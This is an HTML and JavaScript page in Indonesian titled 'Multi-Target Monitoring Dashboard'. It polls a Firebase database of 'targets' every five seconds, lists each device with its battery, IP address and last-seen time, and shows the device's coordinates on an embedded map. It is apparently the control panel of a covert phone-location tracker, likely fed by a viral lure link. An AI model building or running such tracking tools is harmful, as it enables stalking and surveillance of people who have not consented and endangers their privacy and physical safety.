<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Multi-Target Monitoring Dashboard</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }
        .container { display: grid; grid-template-columns: 1fr 400px; gap: 20px; }
        .card { background: #141414; border: 1px solid #00ff41; padding: 15px; border-radius: 8px; }
        table { width: 100%; border-collapse: collapse; font-size: 12px; }
        th, td { border: 1px solid #222; padding: 8px; text-align: left; }
        th { background: #1a1a1a; color: #00ff41; }
        tr:hover { background: #1a1a1a; cursor: pointer; }
        .map-box { height: 400px; border: 1px solid #00ff41; margin-top: 20px; }
        iframe { width: 100%; height: 100%; border: none; filter: invert(90%); }
    </style>
</head>
<body>

<h1>[MULTI-TARGET RADAR]</h1>

<div class="container">
    <div class="card">
        <h2>DAFTAR TARGET AKTIF</h2>
        <table id="targetTable">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>DEVICE</th>
                    <th>BATTERY</th>
                    <th>LAST SEEN</th>
                </tr>
            </thead>
            <tbody>
                </tbody>
        </table>
    </div>

    <div class="card">
        <h2>DETAIL & MAP</h2>
        <div id="detailInfo">Pilih target dari tabel untuk melihat lokasi.</div>
        <div class="map-box" id="mapBox"></div>
    </div>
</div>

<script>
    const DB_ROOT = "https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/targets.json";

    function loadTargets() {
        fetch(DB_ROOT)
        .then(res => res.json())
        .then(targets => {
            const tbody = document.querySelector("#targetTable tbody");
            tbody.innerHTML = "";
            
            for (let id in targets) {
                const t = targets[id];
                const row = `
                    <tr onclick="showMap(${t.lat}, ${t.lon}, '${t.device}', '${t.ip}')">
                        <td>${t.id}</td>
                        <td>${t.device}</td>
                        <td>${t.battery}</td>
                        <td>${t.updated_at.split(',')[1]}</td>
                    </tr>
                `;
                tbody.innerHTML += row;
            }
        });
    }

    function showMap(lat, lon, device, ip) {
        document.getElementById('detailInfo').innerHTML = `<b>Device:</b> ${device} <br> <b>IP:</b> ${ip}`;
        const mapURL = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
        document.getElementById('mapBox').innerHTML = `<iframe src="${mapURL}"></iframe>`;
    }

    setInterval(loadTargets, 5000);
    window.onload = loadTargets;
</script>
</body>
</html>
